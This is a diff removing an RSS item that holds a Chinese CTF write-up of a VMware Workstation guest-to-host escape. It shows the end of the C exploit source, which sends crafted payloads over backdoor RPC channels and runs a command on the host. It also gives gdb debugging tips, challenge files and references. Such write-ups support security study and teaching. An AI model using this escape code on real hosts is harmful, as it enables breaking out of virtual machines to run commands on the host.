-    channel_recv_reply_len(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;len,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv data len\n&quot;);
-        return;
-    }
-    channel_recv_finish2(chan[0].cookie1,chan[0].cookie2,chan[0].num,&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to recv finish2\n&quot;);
-        return;
-    }
-    channel_send_data(chan[1].cookie1,chan[1].cookie2,chan[1].num,8,&amp;amp;pay1,&amp;amp;res);
-    channel_set_len(chan[2].cookie1,chan[2].cookie2,chan[2].num,strlen(s3),&amp;amp;res);
-    if(!res){
-        printf(&quot;fail to set len\n&quot;);
-        return;
-    }
-    channel_set_len(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(s3),&amp;amp;res);
-    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;amp;pay2,&amp;amp;res);
-    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,8,&amp;amp;pay3,&amp;amp;res);
-    channel_send_data(chan[3].cookie1,chan[3].cookie2,chan[3].num,strlen(pay4)+1,pay4,&amp;amp;res);
-    run_cmd(s4);
-    if(!res){
-        printf(&quot;fail to set len\n&quot;);
-        return;
-    }
-}
-void main(){
-    setvbuf(stdout,0,2,0);
-    setvbuf(stderr,0,2,0);
-    setvbuf(stdin,0,2,0);
-    leak();
-    printf(&quot;text base :%p&quot;,text);
-    exploit();
-}	
-&lt;/code&gt;&lt;p&gt;Enjoy your calculator:)&lt;br&gt;&lt;/p&gt;&lt;img src=&quot;https://pic1.zhimg.com/v2-53372f4dacfe152584ea24b2efc6a4a7_r.jpg&quot; data-caption=&quot;&quot; data-size=&quot;normal&quot; data-rawwidth=&quot;640&quot; data-rawheight=&quot;466&quot; data-watermark=&quot;watermark&quot; data-original-src=&quot;v2-53372f4dacfe152584ea24b2efc6a4a7&quot; data-watermark-src=&quot;v2-c19ca28337b91b0fc87d56c97781b99e&quot; data-private-watermark-src=&quot;&quot;&gt;&lt;p&gt;&lt;br&gt;&lt;/p&gt;&lt;h2&gt;关于调试&lt;/h2&gt;&lt;p&gt;调试有点小技巧需要说明一下。首先就是正常的把&lt;code class=&quot;inline&quot;&gt;vmware&lt;/code&gt;开起来，然后在&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;用&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;来&lt;code class=&quot;inline&quot;&gt;attach&lt;/code&gt;上去。这个时候我们会下断点，然后继续运行，进入虚拟机&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面跑&lt;code class=&quot;inline&quot;&gt;exploit&lt;/code&gt;脚本。但大家想一下，如果你还在&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面的时候，&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;的&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;遇到了断点，会怎样？&lt;br&gt;因为&lt;code class=&quot;inline&quot;&gt;gdb&lt;/code&gt;遇到了断点，那么&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;就被停住了。然而你还在&lt;code class=&quot;inline&quot;&gt;guest&lt;/code&gt;里面，你就没有办法按&lt;code class=&quot;inline&quot;&gt;ctrl+alt&lt;/code&gt;切出来了，就像被人放了一招&lt;code class=&quot;inline&quot;&gt;时间停止&lt;/code&gt;一样。这个时候你除了含泪强制关机之外没有什么好办法。所以大家在调试的时候记得现在exp开头加个&lt;code class=&quot;inline&quot;&gt;sleep&lt;/code&gt;,然后在&lt;code class=&quot;inline&quot;&gt;sleep&lt;/code&gt;的时候赶紧把鼠标切出来到&lt;code class=&quot;inline&quot;&gt;host&lt;/code&gt;中。这样就可以正常调试了。(PS:好像&lt;code class=&quot;inline&quot;&gt;mac&lt;/code&gt;不会有这个问题，因为&lt;code class=&quot;inline&quot;&gt;mac&lt;/code&gt;可以直接用触摸板切出来?)&lt;/p&gt;&lt;p&gt;稍微打个广告:如果你觉得这篇文章有用，欢迎到github上follow一波&lt;code class=&quot;inline&quot;&gt;Ne0&lt;/code&gt;(&lt;a href=&quot;https://github.com/Changochen&quot;&gt;https://github.com/Changochen&lt;/a&gt;)和&lt;code class=&quot;inline&quot;&gt;bibi&lt;/code&gt;(&lt;a href=&quot;https://github.com/fpbibi&quot;&gt;https://github.com/fpbibi&lt;/a&gt;)&lt;/p&gt;&lt;h2&gt;相关材料&lt;/h2&gt;&lt;p&gt;题目相关材料：&lt;/p&gt;&lt;blockquote&gt;题目操作系统：Ubuntu x64 1804&lt;br&gt;目标VMWare Workstation：VMware-Workstation-Full-15.0.2-10952284.x86_64.bundle，&lt;a href=&quot;https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp&quot;&gt;https://drive.google.com/open?id=1SlojAhX0NCpWTPjASfM03v5QBvRtT-sp&lt;/a&gt;&lt;br&gt;patched VMX：&lt;a href=&quot;https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E&quot;&gt;https://drive.google.com/open?id=1MJQSQYufGtl9DQnG1osyMk_1YbgCPL-E&lt;/a&gt;&lt;/blockquote&gt;&lt;p&gt;一些参考资料：&lt;/p&gt;&lt;blockquote&gt;&lt;a href=&quot;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&quot;&gt;https://www.zerodayinitiative.com/blog/2017/6/26/use-after-silence-exploiting-a-quietly-patched-uaf-in-vmware&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://www.52pojie.cn/thread-783225-1-1.html&quot;&gt;https://www.52pojie.cn/thread-783225-1-1.html&lt;/a&gt;&lt;br&gt;&lt;a href=&quot;https://sites.google.com/site/chitchatvmback/backdoor&quot;&gt;https://sites.google.com/site/chitchatvmback/backdoor&lt;/a&gt;&lt;/blockquote&gt;</description>
-<author>婴宁</author>
-<guid isPermaLink="false">2018-12-11-52140921</guid>
-<pubDate>Tue, 11 Dec 2018 00:00:00 +0800</pubDate>
 </item>
 </channel>
 </rss>
